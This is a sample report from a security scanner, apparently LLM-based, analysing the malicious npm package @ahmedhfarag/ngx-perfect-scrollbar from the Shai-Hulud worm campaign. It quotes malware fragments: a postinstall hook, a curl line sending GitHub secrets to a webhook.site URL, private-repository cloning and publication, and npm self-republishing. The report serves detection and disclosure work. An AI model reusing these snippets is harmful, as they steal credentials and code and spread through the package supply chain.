# cull scan report

Sample output from `cull scan` against a known-malicious npm package
(`@ahmedhfarag/ngx-perfect-scrollbar@20.0.20`, part of the Shai-Hulud
campaign captured by Datadog's malicious-software-packages-dataset).
Reproduce: `docker run ... cull scan ./node_modules -o report.md`.

Model: `gemini-3.1-flash-lite-preview`
Chunks: 319
Tokens: ~1.59M in / ~57K out
Cost: $0.4666

## @ahmedhfarag/ngx-perfect-scrollbar@20.0.20 (npm) — malicious

### `package.json` — suspicious (medium)
- `install_hook`: The presence of a postinstall script that executes a local JavaScript file is highly suspicious for a library that is ostensibly just an Angular wrapper. This script runs automatically upon installation, providing an opportunity for malicious code to execute on the developer's or CI/CD machine.
  - `"postinstall": "node bundle.js"`

### `bundle.js` — malicious (high)
- `network_exfil`: The script explicitly exfiltrates the contents of GitHub secrets (via ${{ toJSON(secrets) }}) to an external, attacker-controlled webhook site.
  - `curl -d "$CONTENTS" https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`
- `persistence`: The script attempts to create a new GitHub Actions workflow file, which is a common technique for establishing persistence and automating further malicious actions within a compromised repository.
  - `FILE_NAME=".github/workflows/shai-hulud-workflow.yml"`
- `process_spawn`: The script uses curl to interact with the GitHub API, likely to automate the injection of the malicious workflow into the user's repositories.
  - `curl -s -X "$method" -H "Accept: application/vnd.github.v3+json" -H "Authorization: token $GITHUB_TOKEN"`
- `process_spawn`: The script uses curl to interact with the GitHub API to enumerate repositories and modify them, demonstrating unauthorized automated control over the user's infrastructure.
  - `curl -s -X "$method" ... "$API_BASE$endpoint"`
- `network_exfil`: The script enumerates private and internal GitHub repositories belonging to an organization using a provided GitHub token.
  - `github_api "/orgs/$org/repos?type=private,internal&per_page=$PER_PAGE&page=$page"`
- `worm_propagation`: The script performs a mirror clone of private repositories and pushes them to a new location, effectively exfiltrating the entire codebase of the target organization.
  - `git clone --mirror "$source_clone_url" "$repo_dir/$migration_name" ... git push --mirror`
- `process_spawn`: The script programmatically changes the visibility of the newly created repositories to 'public', ensuring the exfiltrated data is accessible to the public.
  - `make_repo_public "$migration_name"`
- `worm_propagation`: The code implements a self-propagating mechanism. It downloads a package tarball, modifies the 'package.json' to include a malicious 'postinstall' script ('node bundle.js'), injects its own code into the package, and then automatically publishes the compromised version to the NPM registry.
  - `await te(`npm publish ${ue}`)`
- `credential_theft`: The 'validateToken' method explicitly uses the provided NPM token to authenticate against the registry, confirming the intent to hijack the maintainer's account for further malicious actions.
  - `headers:{Authorization:`Bearer ${this.token}`,"Npm-Auth-Type":"web","Npm-Command":"whoami"}`
- `process_spawn`: The code uses 'exec' (aliased as 'te') to invoke system-level commands like 'tar', 'gzip', and 'npm' to manipulate package files on the filesystem, which is highly suspicious for a library that should only be providing UI components.
  - `await te(`tar -xf ${le} -C ${ae} package/package.json`);`
